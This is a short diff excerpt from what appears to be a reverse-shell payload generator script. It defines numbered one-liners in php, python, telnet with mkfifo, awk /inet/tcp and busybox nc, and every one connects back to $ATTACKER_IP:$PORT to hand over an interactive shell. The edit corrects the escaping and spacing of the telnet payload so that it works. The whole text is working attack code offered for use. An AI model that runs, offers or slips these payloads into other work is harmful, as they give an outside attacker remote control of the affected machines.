@@ -46,7 +46,7 @@ PAYLOAD_9="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);popen(\"sh <&3 >&3 2>
 PAYLOAD_10="export RHOST=\"$ATTACKER_IP\"; export RPORT=$PORT; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'"
 PAYLOAD_11="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ATTACKER_IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
 PAYLOAD_12="python -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ATTACKER_IP\",$PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"
-PAYLOAD_13="TF=$(mktemp -u); mkfifo $TF && telnet $ATTACKER_IP$PORT 0<$TF | sh 1>$TF"
+PAYLOAD_13="TF=\$(mktemp -u); mkfifo \$TF && telnet \$ATTACKER_IP \$PORT 0<\$TF | sh 1>\$TF"
 PAYLOAD_14="awk 'BEGIN {s = \"/inet/tcp/0/$ATTACKER_IP/$PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
 PAYLOAD_15="busybox nc $ATTACKER_IP $PORT -e sh"
 
